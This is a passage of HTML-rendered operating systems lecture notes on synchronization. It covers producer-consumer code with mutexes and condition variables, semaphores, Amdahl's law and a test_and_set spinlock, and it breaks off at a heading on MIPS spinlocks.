&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// Improved Producer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;mutex_t&lt;/span&gt; mutex = MUTEX_INITIALIZER;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;producer&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; *ignored) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (;;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    item *nextProduced = &lt;span style=&#34;color:#447fcf&#34;&gt;produce_item&lt;/span&gt; ();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;mutex_lock&lt;/span&gt; (&amp;amp;mutex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (count == BUFFER_SIZE) {  &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// remember to do while and not if
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#447fcf&#34;&gt;mutex_unlock&lt;/span&gt; (&amp;amp;mutex);              &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// allow other threads to lock
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#447fcf&#34;&gt;thread_yield&lt;/span&gt; ();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#447fcf&#34;&gt;mutex_lock&lt;/span&gt; (&amp;amp;mutex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    buffer [in] = nextProduced;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    in = (in + &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;) % BUFFER_SIZE;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    count++;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;mutex_unlock&lt;/span&gt; (&amp;amp;mutex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// Improved Consumer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;consumer&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; *ignored) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (;;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;mutex_lock&lt;/span&gt; (&amp;amp;mutex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (count == &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#447fcf&#34;&gt;mutex_unlock&lt;/span&gt; (&amp;amp;mutex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#447fcf&#34;&gt;thread_yield&lt;/span&gt; ();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#447fcf&#34;&gt;mutex_lock&lt;/span&gt; (&amp;amp;mutex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  item *nextConsumed = buffer[out];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  out = (out + &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;) % BUFFER_SIZE;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  count--;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;mutex_unlock&lt;/span&gt; (&amp;amp;mutex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;consume_item&lt;/span&gt; (nextConsumed);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;condition-variables&#34; &gt;Condition Variables
&lt;span&gt;
    &lt;a href=&#34;#condition-variables&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Busy-waiting in application is a bad idea, since it consumes CPU. Instead of calling &lt;code&gt;thread_yield&lt;/code&gt;, we can sleep until a condition is met.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pthread_cond_init&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_cond_t&lt;/span&gt; *, ...);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// unlock&amp;#39;s m atomically and re-acquires it upon signal
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pthread_cond_wait&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_cond_t&lt;/span&gt; *c, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_mutex_t&lt;/span&gt; *m);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// wake a single thread up
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pthread_cond_signal&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_cond_t&lt;/span&gt; *c);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// wake all threads up (one at a time though)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pthread_cond_broadcast&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_cond_t&lt;/span&gt; *c);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;mutex_t&lt;/span&gt; mutex = MUTEX_INITIALIZER;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;cond_t&lt;/span&gt; nonempty = COND_INITIALIZER;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;cond_t&lt;/span&gt; nonfull = COND_INITIALIZER;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// CV Producer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;producer&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; *ignored) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (;;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    item *nextProduced = &lt;span style=&#34;color:#447fcf&#34;&gt;produce_item&lt;/span&gt; ();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;mutex_lock&lt;/span&gt;(&amp;amp;mutex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// remember to use WHILE to avoid race conditions
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (count == BUFFER_SIZE)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#447fcf&#34;&gt;cond_wait&lt;/span&gt;(&amp;amp;nonfull, &amp;amp;mutex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    buffer [in] = nextProduced;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    in = (in + &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;) % BUFFER_SIZE;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    count++;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;cond_signal&lt;/span&gt;(&amp;amp;nonempty);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;mutex_unlock&lt;/span&gt;(&amp;amp;mutex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// CV Consumer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;consumer&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; *ignored) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (;;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;mutex_lock&lt;/span&gt; (&amp;amp;mutex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// remember to use WHILE to avoid race conditions
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (count == &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#447fcf&#34;&gt;cond_wait&lt;/span&gt; (&amp;amp;nonempty, &amp;amp;mutex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    item *nextConsumed = buffer[out];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    out = (out + &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;) % BUFFER_SIZE;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    count--;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;cond_signal&lt;/span&gt; (&amp;amp;nonfull);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;mutex_unlock&lt;/span&gt; (&amp;amp;mutex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;consume_item&lt;/span&gt; (nextConsumed);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Use a while loop with these conditions to avoid race conditions of being beat out by another consumer.&lt;/p&gt;
&lt;h3 id=&#34;semaphores&#34; &gt;Semaphores
&lt;span&gt;
    &lt;a href=&#34;#semaphores&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;A Semaphore is initialized with an integer N.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sem_wait&lt;/code&gt; will return only N more times
than &lt;code&gt;sem_signal&lt;/code&gt; called
&lt;ul&gt;
&lt;li&gt;first N calls to &lt;code&gt;sem_wait&lt;/code&gt; do not block&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Fancy mutex where if n == 0, sem_wait will block.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;sem_init&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sem_t&lt;/span&gt; *s, ..., &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; n); &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// proc_count_mutex = sem_create(&amp;#34;proc_count_mutex&amp;#34;,1);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;sem_wait&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sem_t&lt;/span&gt; *s) (originally called P)  &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// P(sem_t *s)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;sem_signal&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sem_t&lt;/span&gt; *s)  &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// V(sem_t *s)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;synchronization&#34; &gt;Synchronization
&lt;span&gt;
    &lt;a href=&#34;#synchronization&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;motivation&#34; &gt;Motivation
&lt;span&gt;
    &lt;a href=&#34;#motivation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;img class=equation-tall src=&#34;https://latex.codecogs.com/svg.image?T(n)=T(1)(B+\frac{1}{n}(1-B))&#34;&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Amdahl&amp;rsquo;s law&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;T(1): the time one core takes to complete the task&lt;/li&gt;
&lt;li&gt;B: the fraction of the job that must be serial&lt;/li&gt;
&lt;li&gt;n: number of cores
&lt;ul&gt;
&lt;li&gt;Imagine if n was infinity&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ultimate limit on parallel speedup&lt;/li&gt;
&lt;li&gt;Synchronization increases serial section size&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Locking basics&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Lock whenever critical section is required and at least one is writing&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ordering-requirements&#34; &gt;Ordering requirements
&lt;span&gt;
    &lt;a href=&#34;#ordering-requirements&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#447fcf&#34;&gt;test_and_set&lt;/span&gt; (&amp;amp;v-&amp;gt;lock))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// ensure lock is acquired before writing
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;v-&amp;gt;val++;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// this tells the compiler not to reorder
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;asm&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;volatile&lt;/span&gt; (&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;sfence&amp;#34;&lt;/span&gt; ::: &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;memory&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;v-&amp;gt;lock = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;mips-spinlocks&#34; &gt;MIPS Spinlocks
&lt;span&gt;
    &lt;a href=&#34;#mips-spinlocks&#34;&gt;
